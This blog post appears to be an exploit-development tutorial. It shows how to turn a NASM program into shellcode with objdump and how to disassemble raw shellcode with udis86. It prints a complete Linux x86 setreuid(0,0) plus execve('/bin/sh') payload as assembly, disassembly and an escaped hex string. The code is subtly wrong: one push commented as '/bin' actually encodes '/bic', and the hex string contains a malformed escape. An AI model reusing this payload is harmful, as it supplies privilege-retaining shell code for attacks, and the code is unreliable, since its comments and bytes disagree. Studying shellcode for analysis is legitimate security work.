Title: Disassembly
Date: 2011-12-20 17:58
Author: Admin
Category: Technology
Tags: assembly languages, exploit development, fancy punks, hex, linux, shellcode

Often when doing exploit development, it's [necessary to extract hex
opcodes][] from an assembly or C program to generate shellcode.
Normally, to do this, one uses **objdump** as in the following example:

`isis@wintermute:~$ cat shellcode.asm`

section .text

global \_start

\_start:

;; setreuid (0,0)

xor eax, eax ;clear the eax registry

mov al, 0x46 ;set the syscall \# to decimal 70 or hex 46, one byte

xor ebx, ebx

xor ecx, ecx

int 0x80 ;system interrupt to call kernel to execute syscall

;; spawn shellcode with execve

xor eax, eax

push eax ;push a NULL value on the stack

push 0x68732f2f ;push '//sh' onto the stack

push 0x6369622f ;push '/bin' onto the stack

mov ebx, esp ;esp now points to '/bin/sh', so write to ebx

push eax ;push another NULL to terminate char \*\* argv on stack

push ebx ;push pointer to '/bin/sh' onto stack

mov ecx, esp ;esp now holds the address of argv, so write to ecx

xor edx, edx

mov al, 0xb ;set the syscall \# to decimal 11 or hex b, one byte

int 0x80 ;sytem interrupt to call kernel to execute syscall

isis@wintermute:\~\$ nasm -f elf shellcode.asm

isis@wintermute:\~\$ ld -melf\_i386 -o shellcode shellcode.o

isis@wintermute:\~\$ objdump -d ./shellcode

./shellcode: file format elf32-i386

Disassembly of section .text:

08048060 \<\_start\>:

8048060: 31 c0 xor %eax,%eax

8048062: b0 46 mov \$0x46,%al

8048064: 31 db xor %ebx,%ebx

8048066: 31 c9 xor %ecx,%ecx

8048068: cd 80 int \$0x80

804806a: 31 c0 xor %eax,%eax

804806c: 50 push %eax

804806d: 68 2f 2f 73 68 push \$0x68732f2f

8048072: 68 2f 62 69 63 push \$0x6369622f

8048077: 89 e3 mov %esp,%ebx

8048079: 50 push %eax

804807a: 53 push %ebx

804807b: 89 e1 mov %esp,%ecx

804807d: 31 d2 xor %edx,%edx

804807f: b0 0b mov \$0xb,%al

8048081: cd 80 int \$0x80

So, from this example, the shellcode would be:

`\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\x31\xc0\x50\x68\x2f\2f\x73\`

x68\\x68\\x2f\\x62\\x69\\x63\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80

But! What if you have some shellcode, say from a nasty PDF that someone
sent you (though a malPDF's shellcode would be in JavaScript, and so it
would look like "%u68%u73%u2f%u2f"), and you don't want to have to sit
there with a hex-to-ascii chart looking everything up by hand just to
find out what this shellcode is doing? As it turns out, there's a handy
little thing called [udis86][] to do all that boring work for you. You
have to download their tarball, then do:

`$ ./configure && make && make install`

To run udis86 at the commandline, do:

`$ udcli`

Words can't describe how much I'm crushing on this program. Check this
out:

`isis@wintermute:~/$ udcli -x`

31 c0 b0 46 31 db 31 c9 cd 80 31 c0 50 68 2f 2f 73 68 68 2f 62 69 63 89
e3 50 53 89 e1 31 d2 b0 0b cd 80

0000000000000000 31c0 xor eax, eax

0000000000000002 b046 mov al, 0x46

0000000000000004 31db xor ebx, ebx

0000000000000006 31c9 xor ecx, ecx

0000000000000008 cd80 int 0x80

000000000000000a 31c0 xor eax, eax

000000000000000c 50 push eax

000000000000000d 682f2f7368 push dword 0x68732f2f

0000000000000012 682f626963 push dword 0x6369622f

0000000000000017 89e3 mov ebx, esp

0000000000000019 50 push eax

000000000000001a 53 push ebx

000000000000001b 89e1 mov ecx, esp

000000000000001d 31d2 xor edx, edx

000000000000001f b00b mov al, 0xb

0000000000000021 cd80 int 0x80

  [necessary to extract hex opcodes]: http://www.patternsinthevoid.net/blog/2011/09/learning-assembly-through-writing-shellcode/
    "Learning Assembly Through Writing Shellcode"
  [udis86]: http://udis86.sourceforge.net/
